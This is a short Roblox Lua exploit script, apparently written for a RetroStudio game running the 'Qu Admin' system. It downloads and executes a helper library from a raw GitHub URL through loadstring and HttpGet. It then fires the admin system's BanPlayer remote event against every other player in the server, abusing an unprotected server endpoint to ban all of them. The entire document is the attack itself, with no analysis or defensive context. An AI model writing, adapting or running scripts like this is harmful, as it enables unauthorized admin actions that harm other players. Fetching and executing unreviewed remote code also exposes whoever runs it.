local github = 'https://raw.githubusercontent.com/system32unknown/'
local suffix = '/refs/heads/main/'

local RETROAPI = loadstring(game:HttpGet(github .. 'Roblox' .. suffix .. 'retrostudio/noteapi.lua'))()
local PS = game:GetService("Players")

local QU_ADMIN = workspace:FindFirstChild("Qu Admin")
local QU_REMOTE = QU_ADMIN.Code.Remotes
local BAN:RemoteEvent = QU_REMOTE.BanPlayer

RETROAPI.exitAfterFunc(function()
    for _, v in PS:GetPlayers() do
        if v == PS.LocalPlayer then continue end
        BAN:FireServer(unpack({[1] = {[1] = v.Name}}))
    end
end)